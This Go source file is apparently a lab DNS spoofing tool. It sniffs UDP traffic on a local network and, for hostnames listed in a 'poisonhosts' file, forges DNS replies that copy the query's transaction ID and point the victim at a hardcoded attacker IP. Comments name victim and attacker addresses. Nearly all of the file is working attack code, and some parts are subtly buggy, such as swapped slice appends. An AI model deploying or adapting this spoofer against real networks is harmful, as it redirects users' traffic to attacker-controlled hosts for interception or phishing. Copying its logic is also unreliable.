// victim ip:      172.24.18.154
// attacker's ip:  172.24.19.181

package main

import (
    "fmt"
    "os"
    "strings"
    "strconv"
    "time"
    "log"
    "net"
    "io/ioutil"
    "github.com/google/gopacket"
    "github.com/google/gopacket/pcap"
    "github.com/google/gopacket/layers"
)

type DnsMsg struct {
	Timestamp       string
	SourceIP        string
	DestinationIP   string
	DnsQuery        string
	DnsAnswer       []string
	DnsAnswerTTL    []string
	NumberOfAnswers string
	DnsResponseCode string
	DnsId           string
	DnsOpCode       string
}

var (
	intface    string
	filename   string
	devName    string
	es_index   string
	es_docType string
	es_server  string
	err        error
	handle     *pcap.Handle
	InetAddr   string
	SrcIP      string
	DstIP      string
	SrcPort    string
	DstPort    string
	DnsServerPort string
	VicPort string
	DnsServerIP string
	VicIP string
)


func stringInSlice(a string, list []string) bool {
    for _, b := range list {
        if b == a {
            return true
        }
    }
    return false
}


func captureLiveTraffic(interfaceName string, bpfFilter string, hostnames []string, targetips []string){
	var (
		device       string = ""
		snapshot_len int32  = 1024
		promiscuous  bool   = true
		err          error
		timeout      time.Duration = 1 * time.Second
		handle       *pcap.Handle
	)

	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Fatal(err)
	}

	intface = devices[0].Name
	device = intface
	var eth layers.Ethernet
	var ip4 layers.IPv4
	var ip6 layers.IPv6
	var tcp layers.TCP
	var udp layers.UDP
	var dns layers.DNS
	var payload gopacket.Payload


	// Open device
	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	//Setting BPF Filter
	if bpfFilter != "nil" {
		err = handle.SetBPFFilter(bpfFilter)
		if err != nil {
			fmt.Printf("---- Please enter BPF filter in accurate BPF syntax ----\n")
			log.Fatal(err)
		}
	}

	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &eth, &ip4, &ip6, &tcp, &udp, &dns, &payload)

	decodedLayers := make([]gopacket.LayerType, 0, 10)

	for {
		data, _, err := handle.ReadPacketData()
		if err != nil {
			continue
		}

		err = parser.DecodeLayers(data, &decodedLayers)
		for _, typ := range decodedLayers {
			switch typ {
				case layers.LayerTypeUDP:
					VicPort = udp.SrcPort.String()
					DnsServerPort = udp.DstPort.String()
				case layers.LayerTypeIPv4:
					VicIP = ip4.SrcIP.String()
					DnsServerIP = ip4.DstIP.String()
				case layers.LayerTypeDNS:
					dnsId := int(dns.ID)
					
					for _, dnsQuestion := range dns.Questions {
						domain := string(dnsQuestion.Name)
						if(stringInSlice(domain, hostnames)){
							sendTraffic(dnsId, VicIP, VicPort, DnsServerIP, domain)
						}
					}
				}
			}
		}
}

func sendTraffic(tId int, vicIp string, vicPort string, vicDns string, dnsQn string){	
	handle, err = pcap.OpenLive(intface, 1024, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// Create ethernet layer
	eth := layers.Ethernet{
		SrcMAC:       net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		DstMAC:       net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		EthernetType: layers.EthernetTypeIPv4,
	}

	sourceIP := net.ParseIP(vicDns)
	destinationIP := net.ParseIP(vicIp)
	// Create ip layer
	ip := layers.IPv4{
		Version:  4,
		TTL:      64,
		SrcIP:    sourceIP,
		DstIP:    destinationIP,
		Protocol: layers.IPProtocolUDP,
	}

	// Create udp layer
	destinationPort, err := strconv.Atoi(vicPort)

	udp := layers.UDP{
		SrcPort: 53,
		DstPort: layers.UDPPort(destinationPort),
	}

	udp.SetNetworkLayerForChecksum(&ip)
	qnName := []byte(dnsQn)
	qst := layers.DNSQuestion{
		Name:  qnName,
		Type:  layers.DNSTypeCNAME,
		Class: layers.DNSClassIN,
	}
	transactionId := (uint16(tId))
	attIp := "172.24.17.246"

	attackerIp := net.ParseIP(attIp)

	ans := layers.DNSResourceRecord{
		Name:  qnName,
		Type:  layers.DNSTypeA,
		IP:    attackerIp,
		Class: layers.DNSClassIN,
	}

	dns := layers.DNS{
		BaseLayer:    layers.BaseLayer{},
		ID:           transactionId,
		QR:           true,
		OpCode:       0,
		AA:           false,
		TC:           false,
		RD:           true,
		RA:           true,
		Z:            0,
		ResponseCode: 0,
		QDCount:      1,
		ANCount:      1,
		NSCount:      0,
		ARCount:      0,
		Questions:    []layers.DNSQuestion{qst},
		Answers:      []layers.DNSResourceRecord{ans},
	}

	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	if err = gopacket.SerializeLayers(buffer, options,
		&eth,
		&ip,
		&udp,
		&dns,
	); err != nil {
		panic(err)
	}
	outgoingPacket := buffer.Bytes()
	if err = handle.WritePacketData(outgoingPacket); err != nil {
		panic(err)
	}
}


func main(){
	commandLineArgs := os.Args
	if len(commandLineArgs) == 0 {
		fmt.Println("Usage:\nsudo go run [-i interface] [-f filename]")
		fmt.Println("-i flag expects interface name")
	} else {
		data, err := ioutil.ReadFile("poisonhosts")
  		if err != nil {
    		fmt.Println("File reading error", err)
    		return
  		}
  		content := string(data)
  		lines := strings.Split(content, "\n")
  		var hostnames []string
  		var targetips []string

  		for index, element := range lines {
    		_ = index
    		hostname_and_targetip := strings.Fields(element)
    		if len(hostname_and_targetip) == 0{
    			break
    		}
    		targetips = append(hostnames, hostname_and_targetip[0])
    		hostnames = append(targetips, hostname_and_targetip[1])
		}
		
		fmt.Println(hostnames)
		//fmt.Println("Victim's IP: 172.24.16.163")
		//fmt.Println("Attacker's IP: 172.24.17.246")
		interfaceName := "any"
		bpfFilter := "udp"
		captureLiveTraffic(interfaceName, bpfFilter, hostnames, targetips)
	}
}